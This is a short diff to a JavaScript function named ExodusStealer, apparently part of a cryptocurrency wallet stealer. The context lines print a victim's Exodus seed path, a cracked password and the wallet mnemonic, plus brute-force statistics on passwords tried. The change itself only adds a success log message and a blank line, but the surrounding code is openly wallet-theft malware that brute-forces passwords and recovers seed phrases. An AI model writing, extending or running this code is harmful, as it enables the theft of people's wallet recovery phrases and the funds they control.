@@ -183,6 +183,7 @@ async function ExodusStealer(passwords) {
             console.log("Seed Path:", result.exodusInfo.path);
             console.log("Password:", result.password);
             console.log("Mnemonic:", result.mnemonic);
+            console.log("initialized the result successfully");
             if (result.bruteForceInfo) {
                 console.log(
                     `Brute-Force Time: ${result.bruteForceInfo.timeFormatted} (${result.bruteForceInfo.tried_passwords} passwords tried)`
@@ -206,3 +207,4 @@ async function ExodusStealer(passwords) {
         console.error("----------------------");
     }
 })();
+
